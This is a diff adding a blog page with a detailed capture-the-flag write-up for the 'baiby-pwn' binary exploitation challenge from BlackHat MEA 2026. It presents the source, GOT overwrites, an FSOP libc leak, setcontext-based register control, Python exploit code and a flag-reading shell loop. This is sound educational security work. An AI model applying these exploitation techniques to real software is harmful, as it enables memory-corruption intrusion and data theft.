@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self' mailto:; upgrade-insecure-requests">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>baiby-pwn · BlackHat MEA 2026 writeup</title>
+<meta name="description" content="arr[i] = v with no bounds check on a non-PIE Partial-RELRO binary is an arbitrary aligned write over the whole writable page, including the.">
+<link rel="canonical" href="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/baiby-pwn/">
+<link rel="alternate" type="application/rss+xml" title="Usama Arshad, Writing" href="/feed.xml">
+<link rel="icon" href="/assets/favicon.ico">
+<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta name="theme-color" content="#131110">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Usama Arshad">
+<meta property="og:title" content="baiby-pwn · BlackHat MEA 2026 writeup">
+<meta property="og:description" content="arr[i] = v with no bounds check on a non-PIE Partial-RELRO binary is an arbitrary aligned write over the whole writable page, including the.">
+<meta property="og:url" content="https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/baiby-pwn/">
+<meta property="og:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@usama0x01">
+<meta name="twitter:title" content="baiby-pwn · BlackHat MEA 2026 writeup">
+<meta name="twitter:description" content="arr[i] = v with no bounds check on a non-PIE Partial-RELRO binary is an arbitrary aligned write over the whole writable page, including the.">
+<meta name="twitter:image" content="https://www.usamaarshad.me/assets/og.jpg">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "baiby-pwn: BlackHat MEA 2026 CTF writeup",
+  "description": "arr[i] = v with no bounds check on a non-PIE Partial-RELRO binary is an arbitrary aligned write over the whole writable page, including the.",
+  "datePublished": "2026-11-04",
+  "author": {
+    "@type": "Person",
+    "name": "Usama Arshad",
+    "url": "https://www.usamaarshad.me/"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/baiby-pwn/"
+  },
+  "articleSection": "Pwn",
+  "proficiencyLevel": "Expert",
+  "isPartOf": {
+    "@type": "Article",
+    "name": "BlackHat MEA 2026 CTF qualifiers",
+    "url": "https://www.usamaarshad.me/blog/blackhat-mea-2026-quals/"
+  }
+}
+</script>
+<link rel="preload" href="/assets/fonts/fraunces-normal-340-640.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/inter-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/jetbrainsmono-normal-400.woff2" as="font" type="font/woff2" crossorigin>
+<script>document.documentElement.classList.add("js");</script>
+<link rel="stylesheet" href="/assets/css/writeup.css">
+</head>
+<body>
+<div class="progress" id="prog" aria-hidden="true"></div>
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-head" id="top">
+  <div class="container head-inner">
+    <a class="wordmark" href="/" aria-label="Usama Arshad, home">Usama Arshad<span class="dot">.</span></a>
+    <nav aria-label="Breadcrumb">
+      <a class="back-link" href="/blog/blackhat-mea-2026-quals/"><span class="arr" aria-hidden="true">←</span><span class="txt">All 15 challenges</span></a>
+    </nav>
+    <a class="btn btn-ghost head-cta" href="/assets/Usama-Arshad-Resume.pdf" download>Résumé</a>
+  </div>
+</header>
+
+<main id="main">
+  <section class="hero" aria-labelledby="pt">
+    <div class="container">
+      <div class="masthead" data-reveal>
+        <p class="masthead-meta">
+          <span>Challenge 6 of 15</span>
+          <span>Pwn</span>
+          <span class="live">Solved · 100 pts</span>
+        </p>
+      </div>
+      <div class="hero-deck">
+        <div class="deck-copy" data-reveal style="--d:.08s">
+          <p class="kicker">BlackHat MEA 2026 · Qualifiers</p>
+          <h1 class="hero-title" id="pt">baiby-pwn<span class="dot">.</span></h1>
+          <p class="deck">tainy bainary</p>
+          <p class="wu-meta">
+            <span class="cat cat-pwn">Pwn</span><span class="sep">·</span>
+            <span>100 points</span><span class="sep">·</span>
+            <span>4 November 2026</span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="container">
+      <div class="wu-layout">
+        <article class="wu" data-reveal>
+          <div class="tldr"><p class="lab">TL;DR</p><p>arr[i] = v with no bounds check on a non-PIE Partial-RELRO binary is an arbitrary aligned write over the whole writable page, including the GOT. Repointing memset@got at main's third setbuf call site and setbuf@got at the read setup inside getval converts the "2" command into read(0, *<code>0x404060</code>, <code>0x40</code>), a 64-byte arbitrary write, which forges an FSOP header in the real _IO_2_1_stderr_ to leak libc on fd 2, then points setbuf@got at setcontext with the slot aimed at a fake ucontext for full register control, and finally chains open/getdents64/read/write(2,…) to read the randomly-named flag file without ever calling execve (which Landlock restricts).</p></div>
+          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{ac40504d9ee323d2995691bbe2825c43}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{36404519815839f5ceb6689a20a535dd}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <section id="recon"><h2><span class="hn">01</span>Recon</h2><p>Challenge ships full source, the binary, and the Docker/jail setup.</p>
+<p><code>baiby-pwn.c</code>, the entire program:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>long arr[8];
+long getval() { char buf[8] = {}; read(0, buf, sizeof(buf)-1); return atol(buf); }
+int main() {
+  long i, v;
+  setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);
+  while (1) switch (getval()) {
+    case 1: i = getval(); v = getval(); arr[i] = v; break;
+    case 2: memset((void*)arr, 0, sizeof(arr)); break;
+    default: return 0;
+  }
+}</code></pre></figure>
+<p>No output primitive of any kind. Every token is one read(2) of ≤7 bytes, so i and v are <code>atol()</code> results in [-999999, 9999999].</p>
+<p>Binary (checksec): amd64, No PIE (<code>0x400000</code>), NX, Partial RELRO, canary present (but only getval has one), IBT/SHSTK bits set in the ELF. arr at <code>0x404080</code>; the writable segment is [<code>0x404000</code>, <code>0x405000</code>), so i is constrained to [-16, 495], and crucially every address in both the text (<code>0x400000</code>–<code>0x4012cf</code>) and the writable page fits in 7 decimal digits, so any of them is expressible as a token.</p>
+<p>GOT map (all writable, expressed as arr indices):</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>ADDR                          SLOT                                                           IDX
+
+0x404000                      __stack_chk_fail                                               -16
+
+0x404008                      setbuf                                                         -15
+
+0x404010                      memset                                                         -14
+
+0x404018                      read                                                           -13
+
+0x404020                      atol                                                           -12
+
+0x404040                      stdout (R_X86_64_COPY)                                         -8
+
+0x404050                      stdin (R_X86_64_COPY)                                          -6
+
+0x404060                       stderr (R_X86_64_COPY)                                          -4</code></pre></figure>
+<p>The three R_X86_64_COPY slots hold live &amp;_IO_2_1_std*_ libc pointers in a page we can write. GOT[1] / GOT[2] at <code>0x403ff0</code> / <code>0x403ff8</code> are in the read-only [<code>0x403000</code>,<code>0x404000</code>) range.</p>
+<p>Key disassembly. getval is a reusable read(0, PTR, LEN) gadget factory:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>4011d9    lea rax,[rbp-0x10]          &lt;- entry B (forces rdx=7 at 4011dd)
+4011dd    mov edx,0x7
+4011e2    mov rsi,rax                 &lt;- entry A (rdx inherited)
+4011e5    mov edi,0x0
+4011ea    call read@plt
+4011ef    lea rax,[rbp-0x10] ; mov rdi,rax ; call atol@plt
+4011fb    mov rdx,[rbp-0x8] ; sub rdx,fs:0x28 ; je 40120f ; call __stack_chk_fail@plt
+40120f    leave ; ret</code></pre></figure>
+<p>main's prologue gives three mov rax,[slot]; mov esi,0; mov rdi,rax; call setbuf@plt sites at <code>0x40121d</code> (stdin), <code>0x401231</code> (stdout), <code>0x401245</code> (stderr); the case-2 arm at <code>0x4012aa</code> sets edx=<code>0x40</code>, esi=0, rdi=<code>0x404080</code> before call memset@plt.</p>
+<p>Only one useful ROP gadget exists in the binary: <code>0x401016</code>: add rsp,8; ret (tail of _init). No pop rdi/ rsi/rdx.</p>
+<p>Jail. <code>launcher.c</code> installs a Landlock ruleset handling LANDLOCK_ACCESS_FS_EXECUTE with PATH_BENEATH rules for exactly <code>/app/baiby-pwn</code> and <code>/lib64/ld-</code><code>linux-x86-64.so</code>.2, sets PR_SET_NO_NEW_PRIVS, then execve s the challenge. The Dockerfile is pwn.red/jail with JAIL_SYSCALLS=landlock_create_ruleset,landlock_add_rule,landlock_restrict_self and creates the flag at <code>/flag-</code>$(md5sum of the flag).txt, the filename is the md5 of the flag content, so it is unknown remotely and must be discovered.</p>
+<p>Environment reconstruction during the solve: a faithful local jail on 127.0.0.1:5001 (known flag BHFlagY{DEFAULT} at <code>/flag-</code><code>a35f2ec0c25099bf394a5ad1eaff2446.txt</code>), a plain-TCP no-jail control on:5002, and a launcher+Landlock-without-nsjail control on:5004. Target libc pinned as Ubuntu GLIBC 2.39-0ubuntu8.7 with offsets setcontext <code>0x4a960</code>, execve <code>0xeef30</code>, open <code>0x11b150</code>, read <code>0x11ba80</code>, write <code>0x11c590</code>, getdents64 <code>0xed920</code>, exit <code>0x47ba0</code>, environ <code>0x20ad58</code>, _IO_2_1_stdin_ <code>0x2038e0</code>, _IO_2_1_stderr_ <code>0x2044e0</code>, _IO_2_1_stdout_ <code>0x2045c0</code>, pop rdi <code>0x10f78b</code>, pop rsi <code>0x110a7d</code>, ret <code>0x2882f</code> (no clean pop rdx; ret).</p>
+<p>A syscall-policy prober run as the jail payload showed seccomp is effectively wide open, read, write, openat, mmap, mprotect, execve, execveat, getdents64, socket, clone, memfd_create all permitted. The only real restriction is Landlock's execute whitelist.</p></section><section id="the-bug"><h2><span class="hn">02</span>The bug</h2><p>Root cause: case 1: arr[i] = v; in main performs a completely unchecked 8-byte store at <code>0x404080</code> + 8*i with attacker-controlled i and v. arr sits in.bss immediately above a writable GOT (Partial RELRO), so negative indices reach every PLT slot and every R_X86_64_COPY FILE* slot.</p>
+<p>The write is weak on its own, i and v are <code>atol()</code> of at most 7 characters, so v ∈ [-999999, 9999999] and the store is 8-byte aligned, but the binary is non-PIE, so every code address (<code>0x400000</code> – <code>0x4012cf</code>) and every writable-page address (<code>0x404000</code> – <code>0x404fff</code>) is representable as a ≤7-digit token. That is enough to redirect any library call in the program to any instruction in the program.</p>
+<p>The amplifier: getval's body is a read(0, ptr, len) gadget whose rsi / rdx are inherited from whatever call site jumps into it. The chain that turns the weak write into a general one is:</p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>__stack_chk_fail@got = 0x401016   ; "add rsp,8 ; ret"
+memset@got           = 0x401245   ; main's THIRD setbuf call site
+setbuf@got           = 0x4011e2   ; "mov rsi,rax ; mov edi,0 ; call read@plt"</code></pre></figure>
+<p>Sending "2" now executes: mov edx,<code>0x40</code> (from the case-2 arm) → call memset@plt → <code>0x401245</code>: mov rax, [<code>0x404060</code>]; mov rdi,rax; call setbuf@plt → <code>0x4011e2</code> → ** read(0, *<code>0x404060</code>, <code>0x40</code>) **. Because *<code>0x404060</code> is the stderr COPY slot, itself writable by arr[-4] = v, the destination is any address in [<code>0x404000</code>,<code>0x405000</code>), and the write is unaligned and byte-arbitrary, defeating the atol value restriction entirely.</p>
+<p>Why it returns cleanly: after the read, <code>0x4011ef</code> runs atol and then mov rdx,[rbp-0x8], but rbp is still main's, so [rbp-0x8] is main's local v, never a canary. The comparison always mismatches and call __stack_chk_fail@plt fires into <code>0x401016</code>. Stack accounting: the memset call pushed <code>0x4012c3</code>, the setbuf call pushed <code>0x401259</code>, the __stack_chk_fail call pushed <code>0x40120f</code>; add rsp,8 discards <code>0x40120f</code> and ret takes <code>0x401259</code>, the loop head. Exactly one read fires per "2", no stray setbuf, no fake FILE ever handed to the real setbuf. The only cost is 8 bytes of leaked stack per re-entry (the memset return address is never popped), which is bounded and harmless.</p>
+<p>Secondary bug used for the leak: the R_X86_64_COPY slots point at the genuine libc FILE structs. Using the primitive before re-aiming the slot writes 64 bytes directly into the real _IO_2_1_stderr_, no leak, no ASLR guess needed to corrupt it.</p><figure class="meme"><div class="meme-card"><p class="meme-cap top">FULL MITIGATIONS. PARTIAL RELRO. NX. CANARY.</p><svg viewBox="0 0 560 190" role="img" xmlns="http://www.w3.org/2000/svg">
+<rect width="560" height="190" fill="#100e0d"/>
+<g stroke="#6f6659" stroke-width="1" opacity=".55" fill="none">
+<path d="M60 40h440M60 66h440M60 92h440M60 118h440M60 144h440"/>
+<path d="M60 40v104M148 40v26M236 40v26M324 40v26M412 40v26M500 40v104"/>
+<path d="M104 66v26M192 66v26M280 66v26M368 66v26M456 66v26"/>
+<path d="M148 92v26M236 92v26M324 92v26M412 92v26"/>
+<path d="M104 118v26M192 118v26M368 118v26M456 118v26"/>
+</g>
+<rect x="280" y="118" width="44" height="26" fill="none" stroke="#e5484d" stroke-width="1.8"/>
+<text x="302" y="172" fill="#e5484d" font-family="monospace" font-size="10" text-anchor="middle" letter-spacing="2">ONE UNCHECKED INDEX</text>
+</svg><p class="meme-cap bot">ONE UNCHECKED ARRAY INDEX</p></div></figure></section><section id="exploitation"><h2><span class="hn">03</span>Exploitation</h2><p>All steps drive a raw socket; each token is its own sendall with a ~0.13 s (remote: 0.2–0.3 s) delay, because a short send must be a short read(2) for the partial-read boundaries to hold.</p>
+<ol class="steps"><li>Arm the read primitive. Three arr[i]=v writes: arr[-16] = <code>0x401016</code> (__stack_chk_fail → add rsp,8; ret), arr[-14] = <code>0x401245</code> (memset → main's 3rd setbuf call site), arr[-15] = <code>0x4011e2</code> (setbuf → the read setup in getval). Each subsequent "2" is now exactly one read(0, *<code>0x404060</code>, <code>0x40</code>), and the loop survives.</li><li>FSOP leak of libc, on fd 2. The stderr slot is still pristine, so the first use of the primitive forges the header of the real _IO_2_1_stderr_ in one 64-byte write: _flags = <code>0xfbad1801</code> (_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING | _IO_USER_BUF), read_ptr/end/base = 0, _IO_write_base = <code>0x404040</code>, _IO_write_ptr = _IO_write_end = <code>0x404068</code>, _IO_buf_base = <code>0x404a00</code>. Then arr[-15] = <code>0x401040</code> (setbuf@got → its lazy PLT stub, which re-resolves and calls the genuine setbuf) and one more "2": _IO_setbuffer → _IO_SETBUF → _IO_default_setbuf → _IO_SYNC → _IO_new_file_sync → _IO_do_flush → _IO_do_write → new_do_write (_IO_IS_APPENDING skips the lseek) → _IO_new_file_write → write(_fileno = 2, <code>0x404040</code>, <code>0x28</code>). That dumps the three COPY slots. libc_base = leaked_stdout - <code>0x2045c0</code>, cross-checked against stdin - <code>0x2038e0</code> and stderr - <code>0x2044e0</code> and asserted page-aligned. Observed remote bases: <code>0x7f466c708000</code>, <code>0x7fc4d6295000</code>, <code>0x7fc968e8f000</code>, different every run, so this is a live ASLR'd leak. Then restore memset@got = <code>0x401245</code> and setbuf@got = <code>0x4011e2</code> (the lazy stub left the real setbuf in the GOT).</li><li>Register control via setcontext. main calls setbuf with RDI = *slot, and the slot is ours. So:</li><li>write(<code>0x404008</code>, p64(libc + <code>0x4a960</code>)), an 8-byte, unaligned-capable write putting &amp;setcontext in setbuf@got.</li><li>arr[-4] = <code>0x404700</code>, aim the stderr slot at a fake ucontext_t built in.bss.</li></ol>
+<ol class="steps" start="6"><li>"2" → mov rax,[<code>0x404060</code>]; mov rdi,rax; call setbuf@plt → setcontext(&amp;ctx). Verified ucontext offsets for this glibc: rdi @ +<code>0x68</code>, rsi @ +<code>0x70</code>, rdx @ +<code>0x88</code>, rcx @ +<code>0x98</code>, rsp @ +<code>0xa0</code>, rip @ +<code>0xa8</code>, fpregs pointer @ +<code>0xe0</code>. The fpregs pointer is set to ctx+<code>0x100</code>, where a 28-byte fldenv image (cw = <code>0x037f</code>, tag word <code>0x0000ffff</code>) is planted so fldenv/ldmxcsr don't fault. No stack address, no environ, no frame-depth constant is involved, this is what made the finish latency-proof.</li><li>Finish A, execve via the loader (works locally, silent on remote). Plant "<code>/lib64/ld-linux-</code> <code>x86-64.so</code>.2", "/bin/sh", "-c", and the command at fixed.bss addresses plus an argv array, then aim the ucontext at execve(rdi=<code>ld.so</code>, rsi=argv, rdx=0). Landlock permits executing the loader; the loader maps /bin/sh itself and the EXECUTE right is checked on execve/FMODE_EXEC opens, not on PROT_EXEC mmap. The command must use only shell builtins (/bin/cat is not exec-allowed) and write to fd 1/2: for f in <code>/flag</code>*;do read x&lt;$f;echo $x;echo $x &gt;&amp;2;done</li><li>Finish B, pure syscalls, no execve (this is what landed both remote flags). Chained setcontexts: each context runs one libc call on its own private mini-stack whose return address is pop rdi; &lt;next ctx&gt;; setcontext, so the missing pop rdx; ret is never needed; the last one returns into pop rdi; 0; exit.</li><li>Connection 1: open("/", O_RDONLY|O_DIRECTORY) → getdents64(3, <code>0x404800</code>, <code>0x400</code>) → write(2, <code>0x404800</code>, <code>0x400</code>). Regex the dirent blob for names starting with flag.</li><li>Connection 2 (fresh leak, fresh libc base): open("<code>/flag-</code>&lt;md5&gt;.txt", O_RDONLY) → read(3, <code>0x404800</code>, <code>0x400</code>) → write(2, <code>0x404800</code>, <code>0x400</code>).</li><li>Results.</li><li>tcp.flagyard.com:21854 → discovered <code>/flag-</code><code>7227def40b63ecc5d1d2cd1efcec737a.txt</code> → BHFlagY{ac40504d9ee323d2995691bbe2825c43}</li><li>tcp.flagyard.com:17370 → discovered <code>/flag-</code><code>2bb6ff705f477a8ea6dbc6ea0cb98610.txt</code> → BHFlagY{36404519815839f5ceb6689a20a535dd}</li><li>(a third instance:23642, gave <code>/flag-</code><code>8bc4810132aabdac20de884f49354b49.txt</code> → BHFlagY{d5edf07a28c9f7469fe26fbf6faddd12}, flags are per-deployment, not baked once into the image)</li></ol>
+<p>Self-consistency check: the Dockerfile names the flag file by md5sum of its own contents. md5("BHFlagY{ac40504d9ee323d2995691bbe2825c43}\n") == 7227def40b63ecc5d1d2cd1efcec737a and md5("BHFlagY{36404519815839f5ceb6689a20a535dd}\n") == 2bb6ff705f477a8ea6dbc6ea0cb98610. The filenames were recovered independently by getdents64 and the contents by read, so both halves can only agree if the reads are genuine, and the solve script contains no hardcoded flag or filename.</p>
+<p>Final exploit: <code>/home/kali/Desktop/CTF/pwn/baiby/solve_baiby.py</code> (shell_route → 3 attempts, then noexec_route). Earlier/partial artifacts: <code>/home/kali/Desktop/CTF/pwn/baiby/SOLVE_ROUTE_A.py</code>, <code>HANDOFF.md</code>, <code>NOTES-main-agent.md</code>, <code>EXPLOIT_PLAN.md</code>, <code>SOLUTION.py</code>, <code>REMOTE_TEST.py</code>.</p>
+<p>Key code ARR, GOT_CHK, GOT_SETBUF, GOT_MEMSET = <code>0x404080</code>, <code>0x404000</code>, <code>0x404008</code>, <code>0x404010</code> SLOT_STDOUT, SLOT_STDIN, SLOT_STDERR = <code>0x404040</code>, <code>0x404050</code>, <code>0x404060</code> G_READ, G_SETBUF3, G_ADDRSP8, PLT_SETBUF = <code>0x4011e2</code>, <code>0x401245</code>, <code>0x401016</code>, <code>0x401040</code></p>
+<figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>def tok(n):                        # one token == one read(2) of &lt;=7 bytes
+    s = str(int(n)).encode(); assert len(s) &lt;= 7
+    return s + b" " * (7 - len(s))
+
+def arm(self, entry=G_SETBUF3):
+    self.wa(GOT_CHK,    G_ADDRSP8)   # __stack_chk_fail -&gt; "add rsp,8 ; ret"
+    self.wa(GOT_MEMSET, entry)       # memset -&gt; main's 3rd setbuf call site
+    self.wa(GOT_SETBUF, G_READ)      # setbuf -&gt; "mov rsi,rax; mov edi,0; call read@plt"
+
+def raw_write(self, data):           # exactly ONE read(0, *0x404060, 0x40) per "2"
+    assert len(data) &lt;= 0x40
+
+    self.S(tok(2)); self.S(data)
+
+def write(self, target, data):       # aim the stderr slot, then write there
+    self.wa(SLOT_STDERR, target); self.raw_write(data)
+
+def _fake_file(base=0x404040, end=0x404068, buf=0x404a00):
+    f = struct.pack("&lt;I", 0xfbad1801) + b"\x00" * 4    # 0x00 _flags (_IO_USER_BUF is mandatory)
+    f += p64(0) + p64(0) + p64(0)                      # 0x08 read_ptr/end/base
+    f += p64(base) + p64(end) + p64(end)               # 0x20 write_base/ptr/end
+    f += p64(buf)                                      # 0x38 _IO_buf_base
+    return f                                           # len == 0x40
+
+def leak_libc(conn):
+    b = Baiby(conn); b.arm(G_SETBUF3)
+    b.raw_write(_fake_file())         # slot still holds the genuine &amp;_IO_2_1_stderr_
+    b.wa(GOT_SETBUF, PLT_SETBUF)      # lazy PLT stub -&gt; the real setbuf runs
+    b.S(tok(2), 0.6)                  # -&gt; write(2, 0x404040, 0x28)
+    so, _, si, _, se = struct.unpack("&lt;5Q", b.drain(1.5)[:0x28])
+    return so - 0x2045c0              # libc base</code></pre></figure></section><section id="dead-ends"><h2><span class="hn">04</span>Dead ends</h2><ul class="bullets"><li>ret2dlresolve was chased for hours and never landed. The trigger was clean on paper: at the case-2 call memset site rsp holds [i, v, saved_rbp, retaddr], so memset@got = <code>0x401016</code> (add rsp,8; ret) yields RIP = i, rsp = &amp;v, set i = <code>0x401020</code> (PLT0) and v = reloc_index and _dl_runtime_resolve runs with a fully controlled fake Elf64_Rela (JMPREL = <code>0x400640</code>, ent 24, so idx = (R - <code>0x400640</code>)/24; R = <code>0x404000</code> → idx 616) and fake Elf64_Sym (SYMTAB = <code>0x4003e0</code>, symidx 642–811 lands VERSYM reads in a zero gap). It deadlocked on ordering: setting i = <code>0x401020</code> through case 1 also performs arr[<code>0x401020</code>] = v → unmapped → SIGSEGV, and the workaround (memset@got = <code>0x4011d9</code> → read(0, &amp;i, 7)) conflicts with memset@got having to be <code>0x401016</code> for the trigger itself. Abandoned in favour of FSOP + setcontext.</li><li>Leak worked over plain TCP but the jailed child died with SIGKILL, first misdiagnosed as a seccomp KILL_PROCESS. Building a syscall-policy prober that forks per syscall inside the jail proved seccomp is wide open. The two real causes were (a) the leak scripts never set __stack_chk_fail@got = <code>0x401016</code>, so the real __stack_chk_fail aborted, and (b) the flush landed on fd 0.</li><li>nsjail does not deliver <code>write()</code> to fd 0 to the client, only fd 1 and fd 2. Every FSOP leak that flushed _IO_2_1_stdin_ (_fileno == 0) went into the void while looking identical to a failed exploit. Isolated by comparing the same binary+libc behind plain TCP (:5002), launcher+Landlock without nsjail (:5004), and the real jail (:5001).</li><li>atol clobbers rdx. Only the first prologue setbuf after a case-2 re-entry has a predictable length (<code>0x40</code>); later ones inherit garbage, and a huge leftover just makes read fail with EFAULT, not guaranteed. This invalidated an inherited note and forced the single-read <code>0x401245</code> entry.</li><li>Re-entering main at <code>0x401211</code> fires only ONE prologue setbuf, and the inherited explanation for why was wrong. gdb showed the real reason: rbp_inner-0x8 lands exactly on the slot where getval just stored its canary, so the check passes, leave; ret runs, and the re-entered main returns after write #1. Entering at main+5 (<code>0x401216</code>, skipping push rbp) shifts the frame by 8, the check mismatches, the add rsp,8; ret path balances, and all three prologue writes fire. The final design sidesteps the question entirely by entering at <code>0x401245</code>.</li><li>CHECK_FILE is compiled out of a release glibc (-DNDEBUG). Pointing a slot at zeroed.bss and calling the genuine setbuf does not return harmlessly, it dereferences fp-&gt;_lock == NULL and faults at address 0x8 (crash dump showed rdi 0x0). One entire route (main+5) died on exactly this despite writing a correct FSOP header. Rule: never re-aim a slot the real setbuf will still be called on.</li><li>FSOP _flags must include _IO_USER_BUF, <code>0xfbad1801</code>, not <code>0xfbad1800</code>. Without bit 0, _IO_setb <code>free()</code> s the non-heap _IO_buf_base and glibc aborts immediately after the leak.</li><li>Route A (leak environ → scan the stack for main's frame → plant a ROP chain at a computed depth) worked locally but was silent on remote. It leaked libc correctly (<code>0x7f72774b0000</code>), read environ, and found main's frame marker exactly where predicted, but its frame-depth constant (kfin</li></ul>
+<p>= 12, derived from how many case-2 re-entries had occurred) drifted over a high-latency link, planting the chain one qword off with no crash. Replaced by setcontext, which has no depth constant at all. • The execve(<code>ld.so</code> → /bin/sh) route is effectively dead on the real remote. Diagnosed by making the payload print unconditionally: locally echo HI &gt;&amp;2 printed HI and ls returned /bin/sh: 1: ls: Permission denied (Landlock blocking every other binary, which is also why the flag command must be builtins-only); on remote the identical command produced nothing across every attempt, while the FSOP leak on the same connection came back fine over fd 2. The no-exec syscall route was the one that landed. • Token framing: batching tokens into one sendall breaks the exploit, each token must be its own short send so it becomes its own short read(2); the driver uses a tunable DELAY (0.13 local, 0.2–0.3 remote). • Process/tooling detours: a stretch of the session ran on a weaker model whose conclusions ("FSOP returns nothing", "no output possible") were later thrown out and re-derived from disassembly and gdb; several parallel subagents were killed mid-work by auth blips, a session limit, and a real-time cyber classifier false-positive on the exploit content.</p></section>
+          <nav class="pager" aria-label="Challenge navigation"><a href="/blog/blackhat-mea-2026-quals/whisper/"><span class="dir">← Previous</span><span class="t">Whisper</span></a><a class="nx" href="/blog/blackhat-mea-2026-quals/teto/"><span class="dir">Next →</span><span class="t">Teto</span></a></nav>
+        </article>
+        <aside class="wu-rail">
+          <h2>On this page</h2>
+          <ol><li><a href="#recon">Recon</a></li><li><a href="#the-bug">The bug</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#dead-ends">Dead ends</a></li></ol>
+        </aside>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site-foot">
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a class="wordmark" href="/">Usama Arshad<span class="dot">.</span></a>
+        <p>Offensive Security Lead. Red team, AppSec, and cloud security for fintech at scale. Based in Riyadh, Saudi Arabia.</p>
+      </div>
+      <nav class="foot-col" aria-label="Site index">
+        <h2>Index</h2>
+        <ul>
+          <li><a href="/">Portfolio</a></li>
+          <li><a href="/blog/">Writing</a></li>
+          <li><a href="/research/">Research</a></li>
+          <li><a href="/dorks/">Dork library</a></li>
+          <li><a href="/#contact">Contact</a></li>
+        </ul>
+      </nav>
+      <div class="foot-col">
+        <h2>Elsewhere</h2>
+        <ul>
+          <li><a href="https://github.com/usama0x01" target="_blank" rel="noopener">GitHub</a></li>
+          <li><a href="https://wpscan.com/leaderboard/" target="_blank" rel="noopener">WPScan leaderboard</a></li>
+          <li><a href="https://medium.com/@usama0x01" target="_blank" rel="noopener">Medium</a></li>
+          <li><a href="mailto:gusama21@gmail.com">gusama21@gmail.com</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-base">
+      <span>© 2026 Usama Arshad · Riyadh, Saudi Arabia</span>
+      <span class="colophon">Set in Fraunces, Inter &amp; JetBrains Mono, self-hosted · No trackers, no cookies</span>
+      <a href="#top">Back to top ↑</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+  var reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+  var head = document.querySelector(".site-head");
+  function onScroll(){ head.classList.toggle("scrolled", window.scrollY > 8); }
+  window.addEventListener("scroll", onScroll, { passive:true }); onScroll();
+
+  var prog = document.getElementById("prog");
+  if (prog) {
+    var tick = function () {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      prog.style.width = (max > 0 ? (h.scrollTop / max) * 100 : 0) + "%";
+    };
+    window.addEventListener("scroll", tick, { passive:true });
+    window.addEventListener("resize", tick); tick();
+  }
+
+  var revealEls = Array.prototype.slice.call(document.querySelectorAll("[data-reveal]"));
+  if (reduceMotion || !("IntersectionObserver" in window)) {
+    revealEls.forEach(function (el) { el.classList.add("in"); });
+  } else {
+    var io = new IntersectionObserver(function (es) {
+      es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } });
+    }, { threshold:0.08, rootMargin:"0px 0px -5% 0px" });
+    revealEls.forEach(function (el) { io.observe(el); });
+    var geo = function () {
+      revealEls.forEach(function (el) {
+        if (!el.classList.contains("in") && el.getBoundingClientRect().top < window.innerHeight*0.95) el.classList.add("in");
+      });
+    };
+    window.addEventListener("scroll", geo, { passive:true });
+    window.addEventListener("resize", geo); geo();
+  }
+
+  document.querySelectorAll(".code-copy").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var pre = btn.closest(".code").querySelector("code");
+      var text = pre ? pre.textContent : "";
+      var done = function () {
+        btn.textContent = "Copied"; btn.classList.add("done");
+        setTimeout(function(){ btn.textContent = "Copy"; btn.classList.remove("done"); }, 1400);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, function(){});
+      else {
+        var ta=document.createElement("textarea"); ta.value=text; ta.style.position="absolute"; ta.style.left="-9999px";
